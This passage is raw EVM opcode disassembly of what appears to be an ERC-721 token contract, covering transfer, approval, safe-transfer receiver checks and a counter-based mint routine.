DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x825 SWAP1 PUSH2 0x2080 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x872 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x847 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x872 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x855 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x88E PUSH2 0x887 PUSH2 0xAF9 JUMP JUMPDEST DUP4 DUP4 PUSH2 0xF86 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH2 0x8A3 PUSH2 0x89D PUSH2 0xAF9 JUMP JUMPDEST DUP4 PUSH2 0xBBA JUMP JUMPDEST PUSH2 0x8E2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x8D9 SWAP1 PUSH2 0x1D17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x8EE DUP5 DUP5 DUP5 DUP5 PUSH2 0x10F3 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x900 CALLER PUSH1 0x6 SLOAD PUSH2 0x114F JUMP JUMPDEST PUSH1 0x6 SLOAD PUSH32 0xEF1DA42F89C42F48BEFA143007E6F5EFD84A2D1CC3DC97C5EDD2D3373220F66D PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH1 0x1 PUSH1 0x6 SLOAD PUSH2 0x93E SWAP2 SWAP1 PUSH2 0x1F40 JUMP JUMPDEST PUSH1 0x6 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x60 PUSH2 0x951 DUP3 PUSH2 0x116D JUMP JUMPDEST PUSH2 0x990 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x987 SWAP1 PUSH2 0x1E77 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x80 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x57 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x250E PUSH1 0x57 SWAP2 CODECOPY SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x1FFC9A700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP3 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xAB7 DUP2 PUSH2 0x116D JUMP JUMPDEST PUSH2 0xAF6 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xAED SWAP1 PUSH2 0x1E17 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST DUP2 PUSH1 0x4 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xB74 DUP4 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xBC6 DUP4 PUSH2 0x685 JUMP JUMPDEST SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ DUP1 PUSH2 0xC08 JUMPI POP PUSH2 0xC07 DUP2 DUP6 PUSH2 0x9B0 JUMP JUMPDEST JUMPDEST DUP1 PUSH2 0xC46 JUMPI POP DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC2E DUP5 PUSH2 0x4A7 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xC6F DUP3 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xCC5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xCBC SWAP1 PUSH2 0x1D57 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xD35 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xD2C SWAP1 PUSH2 0x1D97 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xD42 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x11AE JUMP JUMPDEST DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0xD62 DUP3 PUSH2 0x685 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xDB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xDAF SWAP1 PUSH2 0x1D57 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x4 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD SWAP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 SSTORE PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD SUB SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0xF44 DUP4 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12D4 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xFF5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFEC SWAP1 PUSH2 0x1DB7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x5 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x17307EAB39AB6107E8899845AD3D59BD9653F200F220920489CA2B5937696C31 DUP4 PUSH1 0x40 MLOAD PUSH2 0x10E6 SWAP2 SWAP1 PUSH2 0x1CDA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH2 0x10FE DUP5 DUP5 DUP5 PUSH2 0xC4F JUMP JUMPDEST PUSH2 0x110A DUP5 DUP5 DUP5 DUP5 PUSH2 0x12DA JUMP JUMPDEST PUSH2 0x1149 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1140 SWAP1 PUSH2 0x1D37 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH2 0x1169 DUP3 DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x20 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x0 DUP2 MSTORE POP PUSH2 0x1471 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x118F DUP4 PUSH2 0xF49 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 GT ISZERO PUSH2 0x12CE JUMPI PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1242 JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x123A SWAP2 SWAP1 PUSH2 0x1F96 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x12CD JUMPI DUP1 PUSH1 0x3 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x12C5 SWAP2 SWAP1 PUSH2 0x1F40 JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST POP POP POP POP JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x12FB DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x14CC JUMP JUMPDEST ISZERO PUSH2 0x1464 JUMPI DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x150B7A02 PUSH2 0x1324 PUSH2 0xAF9 JUMP JUMPDEST DUP8 DUP7 DUP7 PUSH1 0x40 MLOAD DUP6 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1346 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x1C8E JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1360 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x1391 JUMPI POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x138E SWAP2 SWAP1 PUSH2 0x19D6 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH2 0x1414 JUMPI RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13C1 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x13C6 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD EQ ISZERO PUSH2 0x140C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1403 SWAP1 PUSH2 0x1D37 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 MLOAD DUP2 PUSH1 0x20 ADD REVERT JUMPDEST PUSH4 0x150B7A02 PUSH1 0xE0 SHL PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND DUP2 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND EQ SWAP2 POP POP PUSH2 0x1469 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH2 0x147B DUP4 DUP4 PUSH2 0x14EF JUMP JUMPDEST PUSH2 0x1488 PUSH1 0x0 DUP5 DUP5 DUP5 PUSH2 0x12DA JUMP JUMPDEST PUSH2 0x14C7 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x14BE SWAP1 PUSH2 0x1D37 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EXTCODESIZE GT SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x155F JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1556 SWAP1 PUSH2 0x1DF7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x1568 DUP2 PUSH2 0x116D JUMP JUMPDEST ISZERO PUSH2 0x15A8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x159F SWAP1 PUSH2 0x1D77 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0x15B6 PUSH1 0x0 DUP4 DUP4 PUSH1 0x1 PUSH2 0x11AE JUMP JUMPDEST PUSH2 0x15BF DUP2 PUSH2 0x116D JUMP JUMPDEST ISZERO PUSH2 0x15FF JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x15F6 SWAP1 PUSH2 0x1D77 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x3 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x2 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG4 PUSH2 0x1709 PUSH1 0x0 DUP4 DUP4 PUSH1 0x1 PUSH2 0x12D4 JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1720 PUSH2 0x171B DUP5 PUSH2 0x1ED7 JUMP JUMPDEST PUSH2 0x1EB2 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x173C JUMPI PUSH2 0x173B PUSH2 0x2175 JUMP JUMPDEST JUMPDEST PUSH2 0x1747 DUP5 DUP3 DUP6 PUSH2 0x203E JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x175E DUP2 PUSH2 0x24B1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1773 DUP2 PUSH2 0x24C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1788 DUP2 PUSH2 0x24DF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x179D DUP2 PUSH2 0x24DF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x17B8 JUMPI PUSH2 0x17B7 PUSH2 0x2170 JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x17C8 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x170D JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x17E0 DUP2 PUSH2 0x24F6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x17FC JUMPI PUSH2 0x17FB PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x180A DUP5 DUP3 DUP6 ADD PUSH2 0x174F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x182A JUMPI PUSH2 0x1829 PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1838 DUP6 DUP3 DUP7 ADD PUSH2 0x174F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1849 DUP6 DUP3 DUP7 ADD PUSH2 0x174F JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x186C JUMPI PUSH2 0x186B PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x187A DUP7 DUP3 DUP8 ADD PUSH2 0x174F JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x188B DUP7 DUP3 DUP8 ADD PUSH2 0x174F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x189C DUP7 DUP3 DUP8 ADD PUSH2 0x17D1 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x18C0 JUMPI PUSH2 0x18BF PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x18CE DUP8 DUP3 DUP9 ADD PUSH2 0x174F JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x18DF DUP8 DUP3 DUP9 ADD PUSH2 0x174F JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x18F0 DUP8 DUP3 DUP9 ADD PUSH2 0x17D1 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x1911 JUMPI PUSH2 0x1910 PUSH2 0x217A JUMP JUMPDEST JUMPDEST PUSH2 0x191D DUP8 DUP3 DUP9 ADD PUSH2 0x17A3 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1940 JUMPI PUSH2 0x193F PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x194E DUP6 DUP3 DUP7 ADD PUSH2 0x174F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x195F DUP6 DUP3 DUP7 ADD PUSH2 0x1764 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1980 JUMPI PUSH2 0x197F PUSH2 0x217F JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x198E DUP6 DUP3 DUP7 ADD PUSH2 0x174F JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x199F DUP6 DUP3 DUP7 ADD PUSH2 0x17D1 